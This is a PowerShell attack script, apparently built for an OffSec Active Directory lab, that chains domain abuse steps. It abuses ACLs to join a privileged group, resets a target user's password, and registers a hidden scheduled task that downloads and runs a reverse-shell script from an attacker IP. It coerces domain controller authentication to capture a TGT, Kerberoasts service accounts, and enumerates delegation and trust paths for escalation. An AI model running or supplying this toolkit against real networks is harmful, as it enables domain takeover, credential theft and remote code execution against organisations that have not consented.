# Offsec-AD-Abuse-Toolkit-FULL.ps1
# Updated: Includes Kerberoast, Unconstrained, Constrained, RBCD
# Run elevated, with PowerView, Rubeus, Mimikatz, PsExec etc. in path

param (
    [string]$AttackIP       = "192.168.45.200",      # your listener IP
    [string]$RevPort        = "4444",
    [string]$DC             = "cdc01.prod.corp1.com",
    [string]$DelegatedHost  = "appsrv01.prod.corp1.com",
    [string]$TargetUser     = "testservice1",
    [string]$TargetGroup    = "TestGroup",
    [string]$NewPassword    = "h4x",
    [string]$KrbtgtHash     = "cce9d6cd94eb31ccfbb7cc8eeadf7ce1"   # ← replace with real hash after DCSync
)

Clear-Host
Write-Host "Offsec AD Abuse Toolkit - FULL VERSION" -ForegroundColor Cyan
Write-Host "Current user : $env:USERDOMAIN\$env:USERNAME" -ForegroundColor Gray
Write-Host "Date         : $(Get-Date -Format 'yyyy-MM-dd HH:mm')" -ForegroundColor Gray
Write-Host ""

# ──────────────────────────────────────────────────────────────────────────────
# 1. ACL Enumeration - Users (GenericAll / WriteDacl / etc.)
# ──────────────────────────────────────────────────────────────────────────────
Write-Host "[1] Dangerous ACLs on Users" -ForegroundColor Green
$me = "$env:USERDOMAIN\$env:USERNAME"
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs |
    Where-Object { 
        $_.IdentityReference -eq $me -and 
        $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|GenericWrite|ForceChangePassword"
    } | 
    Select-Object ObjectDN, ActiveDirectoryRights, ObjectAceType, IsInherited |
    Format-Table -AutoSize

# ──────────────────────────────────────────────────────────────────────────────
# 2. ACL Enumeration - Groups
# ──────────────────────────────────────────────────────────────────────────────
Write-Host "[2] Dangerous ACLs on Groups" -ForegroundColor Green
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs |
    Where-Object { 
        $_.IdentityReference -eq $me -and 
        $_.ActiveDirectoryRights -match "GenericAll|WriteMembers"
    } | 
    Select-Object ObjectDN, ActiveDirectoryRights, ObjectAceType, IsInherited |
    Format-Table -AutoSize

# ──────────────────────────────────────────────────────────────────────────────
# 3. Add self to privileged group
# ──────────────────────────────────────────────────────────────────────────────
Write-Host "[3] Adding self to group: $TargetGroup" -ForegroundColor Green
net group "$TargetGroup" $env:USERNAME /add /domain

# ──────────────────────────────────────────────────────────────────────────────
# 4. Reset password of target user
# ──────────────────────────────────────────────────────────────────────────────
Write-Host "[4] Resetting password of $TargetUser to $NewPassword" -ForegroundColor Green
net user $TargetUser $NewPassword /domain

# ──────────────────────────────────────────────────────────────────────────────
# 5. Scheduled Task reverse shell (as target user)
# ──────────────────────────────────────────────────────────────────────────────
Write-Host "[5] Creating scheduled task reverse shell as $TargetUser" -ForegroundColor Green
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-nop -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://$AttackIP/shell.ps1'))"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(30)
$principal = New-ScheduledTaskPrincipal -UserId "PROD\$TargetUser" -LogonType Password -RunLevel Highest
Register-ScheduledTask -TaskName "UpdateCheck" -Action $action -Trigger $trigger -Principal $principal -Force
Write-Host "Task registered. Catch shell on $AttackIP`:$RevPort" -ForegroundColor Yellow

# ──────────────────────────────────────────────────────────────────────────────
# 6. Unconstrained Delegation - Coerce DC$ auth + grab TGT
# ──────────────────────────────────────────────────────────────────────────────
Write-Host "[6] Unconstrained Delegation - Coerce & Monitor" -ForegroundColor Green
Write-Host "Launching Rubeus monitor in background (filter on $DC machine account)..."
Start-Process -FilePath "C:\Tools\Rubeus.exe" -ArgumentList "monitor /interval:5 /filteruser:$($DC.Split('.')[0])$" -NoNewWindow -PassThru | Out-Null
Start-Sleep -Seconds 3
Write-Host "Coercing authentication from $DC to $env:COMPUTERNAME ..."
C:\Tools\SpoolSample.exe $DC $env:COMPUTERNAME
Write-Host "Check Rubeus output in the other window for CDC01$ TGT" -ForegroundColor Yellow

# ──────────────────────────────────────────────────────────────────────────────
# 7. Kerberoasting (request TGS for SPN accounts)
# ──────────────────────────────────────────────────────────────────────────────
Write-Host "[7] Kerberoasting - Request TGS tickets" -ForegroundColor Green
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,pwdlastset |
    Where-Object { $_.samaccountname -notlike "*$" } |
    ForEach-Object {
        Write-Host "Requesting TGS for $($_.samaccountname) / $($_.serviceprincipalname)"
        Add-Type -AssemblyName System.IdentityModel
        New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.serviceprincipalname
    }
Write-Host "Tickets requested. Use Rubeus to export / crack:" -ForegroundColor Yellow
Write-Host "  Rubeus.exe harvest /outfile:hashes.txt" -ForegroundColor DarkYellow

# ──────────────────────────────────────────────────────────────────────────────
# 8. Constrained Delegation Enumeration
# ──────────────────────────────────────────────────────────────────────────────
Write-Host "[8] Constrained Delegation - AllowedToDelegateTo" -ForegroundColor Green
Get-DomainUser -TrustedToAuth -Properties samaccountname,msds-allowedtodelegateto |
    Where-Object { $_.msds-allowedtodelegateto } |
    Select-Object samaccountname, @{Name="AllowedToDelegateTo";Expression={$_.msds-allowedtodelegateto -join ", "}} |
    Format-Table -AutoSize

# ──────────────────────────────────────────────────────────────────────────────
# 9. Resource-Based Constrained Delegation (RBCD) - Find controllable computers
# ──────────────────────────────────────────────────────────────────────────────
Write-Host "[9] RBCD - Computers you can control (msDS-AllowedToActOnBehalfOfOtherIdentity)" -ForegroundColor Green
Get-DomainComputer -Properties samaccountname,msds-allowedtoactonbehalfofotheridentity |
    Where-Object { $_.msds-allowedtoactonbehalfofotheridentity } |
    Select-Object samaccountname, @{Name="AllowedPrincipals";Expression={$_.msds-allowedtoactonbehalfofotheridentity -join ", "}} |
    Format-Table -AutoSize

# Bonus: Computers you can set RBCD on (GenericWrite / GenericAll on computer objects)
Write-Host "`nComputers where you have GenericAll / GenericWrite (potential RBCD targets):" -ForegroundColor Green
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs |
    Where-Object { 
        $_.IdentityReference -eq $me -and 
        $_.ActiveDirectoryRights -match "GenericAll|GenericWrite"
    } | 
    Select-Object ObjectDN, ActiveDirectoryRights |
    Format-Table -AutoSize

# ──────────────────────────────────────────────────────────────────────────────
# 10. Forest / Trust Enumeration
# ──────────────────────────────────────────────────────────────────────────────
Write-Host "[10] Forest & Domain Trust Enumeration" -ForegroundColor Green

# .NET
Write-Host "`n.NET trusts:"
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() | Format-Table -AutoSize

# Win32 API
Write-Host "`nWin32 API trusts:"
Get-DomainTrust -API | Format-Table SourceName, TargetName, Flags, TrustType -AutoSize

# LDAP
Write-Host "`nLDAP trusts:"
Get-DomainTrust | Format-Table SourceName, TargetName, TrustDirection -AutoSize

# Enterprise Admins
Write-Host "`nEnterprise Admins members (corp1.com):"
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain corp1.com -Recurse | 
    Select-Object MemberName, MemberDomain | Format-Table -AutoSize

Write-Host ""
Write-Host "Toolkit complete." -ForegroundColor Cyan
Write-Host "Remember to replace `$KrbtgtHash` after DCSync and customize IPs/paths as needed." -ForegroundColor DarkGray
